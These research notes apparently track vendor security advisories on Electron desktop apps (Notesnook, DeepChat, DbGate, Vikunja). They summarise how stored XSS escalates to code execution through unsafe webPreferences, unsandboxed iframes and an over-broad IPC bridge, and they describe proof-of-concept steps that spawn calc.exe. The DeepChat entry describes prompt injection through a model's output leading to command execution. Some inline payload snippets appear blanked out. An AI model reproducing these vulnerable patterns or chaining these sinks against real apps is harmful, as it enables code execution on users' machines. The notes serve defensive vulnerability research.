context_non_venue.incomplete_fix_chains_2026-09-01: THE APP NOW HAS TWO INDEPENDENT XSS INCOMPLETE-FIX CHAINS PLUS ONE PATH-TRAVERSAL CHAIN, all vendor-documented. CHAIN A (aria-label sink family): CVE-2026-34585 -> CVE-2026-44588 -> CVE-2026-50551. CHAIN B (Bazaar README, NEW this run): CVE-2026-33066 -> CVE-2026-40922. CHAIN C (path traversal, different weakness class): GHSA-6865-qjcf-286f -> GHSA-gw25-m53r-qh88. The value of Chain B is that its failure mode is DIFFERENT from Chain A's and from the original bug's, so the three together enumerate the ways sink-level remediation fails: (i) the sanitizer is never called (-33066); (ii) the correct sanitizer is called at some sibling sites and not others (-50551, -44588, -33067); (iii) the sanitizer is called correctly everywhere and is itself inadequate for the attribute it is asked to check (-40922). A thesis can state that as a closed taxonomy of sink-patching failure observed in ONE application within a single year, which is a materially stronger claim than 'fixes are incomplete'.

context_non_venue.title: Notesnook desktop client (Electron) XSS-to-RCE advisory pair, 2026 — CVE-2026-33976 (Web Clipper) and CVE-2026-42090 (note export)
context_non_venue.title_norm: notesnook desktop client electron xss to rce advisory pair 2026
authors: Reporters: ngocnn97 (GHSA-f42f-phvp-43x5 / CVE-2026-33976); iiihaiii (GHSA-fjm8-jg78-89h4 / CVE-2026-42090). Publisher: thecodrr (Notesnook maintainer)
context_non_venue.venue: GitHub Security Advisories, streetwriters/notesnook repository (vendor-published)
context_non_venue.scope_topical: PRIMARY (XSS→RCE in a real Electron desktop app, exactly the thesis vulnerability class) — but vendor advisories, not peer-reviewed academic work
context_non_venue.why: SECOND independent application-level case study of the same insecure-profile pattern, and the one that turns the SiYuan entry from an anecdote into a CROSS-APPLICATION claim. Notesnook (streetwriters/notesnook, ~14.1-14.4k GitHub stars) is a note-taking app whose Electron desktop client ships `nodeIntegration: true` / `contextIsolation: false` (and `nodeIntegrationInWorker: true`), and the vendor published TWO Critical 9.6 XSS→RCE advisories against that same profile a month apart, through two entirely different feature paths, reported by two different people. Both were read END-TO-END from the GitHub advisory pages this run. (a) GHSA-f42f-phvp-43x5 / CVE-2026-33976 — 'RCE via stored XSS in Web Clipper rendering', published 25 Mar 2026, affected Web/Desktop <3.3.11 (patched 3.3.11) and iOS/Android <3.3.17 (patched 3.3.17), reporter ngocnn97 — WHO IS ALSO THE REPORTER OF THE SiYuan stored-XSS advisory GHSA-phhp-9rm9-6gr2, i.e. one researcher replaying one technique across two unrelated Electron apps. Root cause: the Web Clipper's `toAttributes()` (packages/clipper/src/index.ts) copies EVERY attribute from the source page's documentElement with no filtering, so event-handler attributes (`onload`, `onclick`, `onmouseover`) from an attacker-controlled page are preserved into the stored `.clip` attachment; the web-clip renderer (packages/editor/src/extensions/web-clip/component.tsx) then writes that HTML into a SAME-ORIGIN, UNSANDBOXED iframe via `iframe.contentDocument.write(...)` (the `<iframe>` element carries no `sandbox` attribute). Delivery is a sync-propagated stored payload: the victim clips an attacker page, the clip syncs to every device, and opening it on desktop fires the handler with Node privileges. (b) GHSA-fjm8-jg78-89h4 / CVE-2026-42090 — 'RCE via stored XSS in note export rendering', published 25 Apr 2026, affected Web/Desktop <3.3.15 (patched 3.3.15) and iOS/Android <3.3.20 (patched 3.3.20), reporter iiihaiii. Root cause: note `title`, `headline` and `content` are interpolated into the export HTML template WITHOUT escaping (packages/core/src/utils/templates/html/template.ts lines 31, 33, 210, 211, reached via notes.ts:416 and common/src/utils/export-notes.ts:219), and `exportToPDF()` (apps/web/src/common/export.ts:40) sets `iframe.srcdoc = content` with NO `sandbox` attribute. Because `srcdoc` INHERITS THE PARENT ORIGIN, injected script reaches `parent.require('fs')` / `parent.require('child_process')` — the advisory's PoC writes %TEMP%/notesnook-xss-proof.txt and separately spawns calc.exe. The advisory pins the profile to a file and line: apps/desktop/src/main.ts:126 — `nodeIntegration: true`, `contextIsolation: false`, `nodeIntegrationInWorker: true`. WHY THIS MATTERS TO THE ARGUMENT: (1) GENERALITY — the SiYuan series alone could be dismissed as one badly-configured project; Notesnook is an independent codebase, an independent maintainer and an independent reporter exhibiting the identical escalation, which supports stating the pattern as a CLASS rather than a case. (2) A SECOND, DISTINCT ESCALATION PRIMITIVE — SiYuan escalates through direct DOM sinks (`insertAdjacentHTML`) in the top-level renderer; Notesnook escalates through SAME-ORIGIN UNSANDBOXED IFRAMES (`contentDocument.write` and `srcdoc`), where the missing `sandbox` attribute is what carries Node privileges into attacker-controlled markup. That is a concrete, checkable detection predicate an Electron audit tool could implement (`nodeIntegration && !contextIsolation && iframe without sandbox`) and one that config-level auditing such as Inspectron, which inspects webPreferences, would not by itself flag. (3) THE SAME PER-SINK-PATCHING FAILURE — both fixes are at the sink (escape the template / filter the attributes); the `main.ts:126` profile is unchanged across both advisories a month apart, exactly the 'fixed at the sink, never at the profile' dynamic the SiYuan advisory names verbatim. (4) IMPORT/EXPORT AND SYNC AS ATTACK SURFACE — neither payload arrives over the network at render time; both ride the app's own data flows (clip sync, backup/import, PDF export), i.e. surfaces a network-facing fuzzer would not reach and that Proton's message-passing model does not cover either.
context_non_venue.venue_status: Vendor-published GitHub Security Advisories, not peer-reviewed and not at any of the 9 watched venues → context only, NOT added to in_scope[]/excluded[], consistent with the handling of ElectroVolt (Black Hat / DEF CON 30), the upstream Electron CVE entry, and the SiYuan advisory series. Use as motivation, impact, taxonomy and baseline-comparison evidence, never as related work.

CVE-2026-33976.title: RCE via stored XSS in Web Clipper rendering
CVE-2026-33976.root_cause_verbatim: the clipper preserves attacker-controlled attributes from the source page's root element and stores them inside web-clip HTML. When the clip is later opened, Notesnook renders that HTML into a same-origin, unsandboxed iframe using `contentDocument.write(...)`. Event-handler attributes such as `onload`, `onclick`, or `onmouseover` execute in the Notesnook origin. In the desktop app, this becomes RCE because Electron is configured with `nodeIntegration: true` and `contextIsolation: false`.

context_non_venue.title: DeepChat desktop client (Electron) XSS-to-RCE via over-broad IPC bridge — GHSA-v8v5-c872-mf8r / CVE-2025-66222
context_non_venue.title_norm: deepchat desktop client electron xss to rce via over broad ipc bridge
context_non_venue.venue: GitHub Security Advisory, ThinkInAIXYZ/deepchat repository (vendor-published)
context_non_venue.scope_topical: PRIMARY (XSS→RCE in a real Electron desktop app via renderer→main IPC, exactly the thesis vulnerability class) — but a vendor advisory, not peer-reviewed academic work
context_non_venue.why: THIRD independent application-level case study, and the one that CORRECTS the generalization the SiYuan and Notesnook entries were converging on. Those two both escalate through `nodeIntegration: true` + `contextIsolation: false` — an unsafe *webPreferences profile*. DeepChat (ThinkInAIXYZ/deepchat, ~5.8k stars, an LLM chat client) escalates through a completely different mechanism: an **over-broad IPC bridge with an unvalidated command-execution gadget behind it**, with no reliance on nodeIntegration anywhere in the chain. Read end-to-end from the GHSA page. THE CHAIN, verbatim from the advisory: (1) XSS SINK — `MermaidArtifact.vue` renders diagram content with `mermaidRef.value.innerHTML = props.block.content`, so `` embedded in Mermaid syntax executes *before* the Mermaid library's own sanitization runs. (2) INSECURE IPC EXPOSURE — the app exposes the raw `ipcRenderer` to the renderer as `window.electron`, and the main process registers a GENERIC routing handler, `ipcMain.handle('presenter:call', (event, name, method, ...payloads) => ...)`, that allows invoking ANY method on ANY 'Presenter' class. (3) RCE GADGET — `McpPresenter.addMcpServer` accepts a server-config object including a `command` property WITHOUT validating the executable path, and `startServer` then runs it via `child_process.spawn`. The PoC is a single Mermaid artifact whose `onerror` calls `ipc.invoke('presenter:call','mcpPresenter','addMcpServer', ...{command:'calc.exe'...})` then `startServer`, working under DEFAULT SETTINGS (the advisory notes MCP does not even need to be enabled first). WHY THIS MATTERS TO THE ARGUMENT: (1) IT BREAKS THE PROFILE-ONLY STORY. The thesis-relevant claim after SiYuan+Notesnook was 'the unsafe webPreferences profile is the root cause and per-sink patching does not close the class'. DeepChat shows the DUAL failure mode: even with a nominally correct profile, exposing raw `ipcRenderer` plus a *generic method-dispatch* IPC handler reconstitutes full Node privilege in the renderer. An audit tool that only inspects `webPreferences` (Inspectron) would give this app a clean bill of health. (2) IT IS A REAL-WORLD MESSAGE-PROGRESSION VULNERABILITY. renderer DOM sink -> `presenter:call` IPC -> main-process presenter method -> `child_process.spawn`: attacker-controlled input propagating across the process boundary via message passing into a privileged sink is exactly the MPV class Proton / 'Buzz to Boom' defines. This is field evidence for that bug class from an app OUTSIDE that paper's 589-app corpus. (3) A NEW DELIVERY CHANNEL THE WATCH HAS NOT SEEN — PROMPT INJECTION. The advisory's impact statement, verbatim: 'Any malicious prompt injection (e.g., from a web search result, a shared conversation, or a malicious model response) can execute arbitrary system commands on the victim's machine.' The untrusted content enters through the LLM's own output, i.e. an attack surface that neither webPreferences auditing, DOM-tree typing, nor network-facing fuzzing models. For a 2026 thesis this is a strong forward-looking scoping point: LLM-backed Electron clients are a growing app class whose renderer content is attacker-influenceable by construction. (4) UNPATCHED. 'Patched versions: None' as rendered on the advisory page — unlike the SiYuan and Notesnook advisories, which all name a fixed release.

context_non_venue.title: DbGate desktop client (Electron) stored XSS-to-RCE via Svelte {@html} icon sink — GHSA-35xm-qvjg-8m42 / CVE-2026-34725
context_non_venue.title_norm: dbgate desktop client electron stored xss to rce via svelte html icon sink
context_non_venue.venue: GitHub Security Advisory, dbgate/dbgate repository (vendor-published)
context_non_venue.scope_topical: PRIMARY (stored XSS→RCE in a real Electron desktop app, exactly the thesis vulnerability class) — but a vendor advisory, not peer-reviewed academic work
context_non_venue.why: FOURTH independent application-level case study, and the strongest single piece of evidence so far that this class is SYSTEMATICALLY DISCOVERABLE rather than incidental. DbGate (dbgate/dbgate) is a database-management GUI whose desktop build is Electron. Read end-to-end from the GHSA page. THE CHAIN, verbatim from the advisory: (1) STORED SINK — `packages/web/src/icons/FontIcon.svelte` treats any icon string starting with ``. This makes `applicationIcon` a stored XSS sink. (2) PRIVILEGE — `app/src/electron.js` sets `nodeIntegration: true` and `contextIsolation: false`, so 'JavaScript gained through XSS can access Node/Electron APIs, making local code execution possible'. (3) POC — an app-definition JSON whose `applicationIcon` is a benign ``, with `usageRules` regexes set to match any database so the icon is certain to render. WHY THIS MATTERS TO THE ARGUMENT — four defensible uses: (1) SAME REPORTER, THIRD APP. The reporter credited on this advisory is `ngocnn97` — per this repo's own earlier entries, the same reporter as SiYuan's stored-XSS advisory (GHSA-phhp-9rm9-6gr2) and Notesnook's Web Clipper advisory (CVE-2026-33976). One researcher has now landed the identical XSS→RCE technique against THREE unrelated codebases. That is direct evidence the family-(A) pattern is mechanically findable at scale by a human, which is precisely the argument for automating it — the motivating observation a discovery thesis wants. (2) A NEW SINK TYPE: FRAMEWORK RAW-HTML DIRECTIVE. Prior corpus sinks were browser DOM APIs — `insertAdjacentHTML` (SiYuan), `contentDocument.write` and `srcdoc` (Notesnook), `innerHTML` (DeepChat). This one is Svelte's `{@html}`, i.e. a deliberate escape hatch out of a framework's automatic escaping. That generalizes to a compact, greppable predicate across the whole modern-frontend Electron population: `{@html}` (Svelte) / `v-html` (Vue) / `dangerouslySetInnerHTML` (React) reachable from stored data, inside a renderer with `nodeIntegration:true`. A DOM-API-only sink list misses all three. (3) A NEW DELIVERY CHANNEL: THE APP'S OWN CONFIGURATION FILE. The payload does not arrive over the network or via sync — the victim IMPORTS OR SAVES an attacker-supplied application-definition JSON, which DbGate later loads through `apps/get-all-apps`. Together with Notesnook's clip-sync and PDF-export paths this establishes a general point: in desktop apps the untrusted-input frontier includes project/config/profile files, a surface a network-facing web fuzzer never reaches. (4) SAME BUG, TWO SEVERITIES — THE CLEANEST MOTIVATION SENTENCE IN THE CORPUS. DbGate ships the same Svelte code as a web app and as an Electron desktop app, and the advisory scores the two separately: in the web UI the impact is 'token theft, session hijacking, and performing privileged actions as the victim inside DbGate'; in Electron it is local code execution. Identical source, identical sink, and the desktop runtime alone converts a session bug into an RCE. That is the thesis's premise stated by a vendor, in one advisory, without any interpretation needed.

context_non_venue.why: FIFTH independent application in the corpus, and the single most argument-relevant advisory the watch has found so far — because of what it does NOT contain. THE POINT: this advisory has NO source, NO sink, NO XSS bug and NO exploit payload. The vendor assigned CVE-2026-33334 to the webPreferences PROFILE ITSELF, on the stated argument that 'any cross-site scripting (XSS) vulnerability in the Vikunja web frontend -- present or future -- automatically escalates to full remote code execution on the victim's machine.' Every other advisory in this corpus (SiYuan x9, Notesnook x2, DeepChat, DbGate) pairs a concrete sink with the escalation; the config is background. Here the config IS the vulnerability. WHY THAT MATTERS TO A DISCOVERY THESIS, three ways. (1) IT VALIDATES CONFIG-LEVEL AUDITING AS A DISCOVERY TARGET, NOT A HEURISTIC. Inspectron (USENIX Sec '24) audits Electron apps for unsafe configuration; a standing objection to that line is that an unsafe config is only a risk multiplier, not a bug, so a config finding is not a vulnerability until someone also finds an XSS. THIS ADVISORY IS A VENDOR, WITH A CNA-ISSUED CVE AND A CVSS RATING OF HIGH, DISAGREEING WITH THAT OBJECTION IN PUBLIC. A thesis that builds a config-auditing discovery tool can cite this as evidence that the output of such a tool is itself reportable, which directly addresses the 'so what' question about Inspectron-style results. (2) IT IS THE FIRST TOOL-ATTRIBUTED DISCOVERY IN THE ENTIRE CORPUS. Credits, verbatim: 'This vulnerability was found using GitHub Security Lab Taskflows' (github.com/GitHubSecurityLab/seclab-taskflows). Every other advisory here is credited to a named human (ngocnn97 x3, @hypnguyen1209, Yunkaiwjs). This is field evidence that an automated/agentic pipeline is already landing this exact bug class against real repositories — which is simultaneously (a) motivation that the class is mechanisable and (b) a competitive-landscape fact a thesis must engage with rather than discover late. INVESTIGATING seclab-taskflows IS THE HIGHEST-VALUE FOLLOW-UP THIS WATCH HAS QUEUED. (3) IT SUPPLIES THE CLEANEST STATEMENT OF THE THESIS PREMISE ANYWHERE IN THE REPO, in the vendor's words: 'Any XSS vulnerability -- which would normally be rated Medium to High in a web context -- becomes a Critical RCE in the desktop application. This dramatically increases the blast radius of frontend security bugs and makes the desktop wrapper a high-value target.' Compare DbGate, which made the same point by scoring one codebase twice; Vikunja states it as a general principle. NOTE ALSO the unusually small root cause: a seven-line BrowserWindow constructor. The whole vulnerability is `webPreferences: { nodeIntegration: true }` at desktop/main.js:11-17 with nothing else set — about as greppable a predicate as exists.
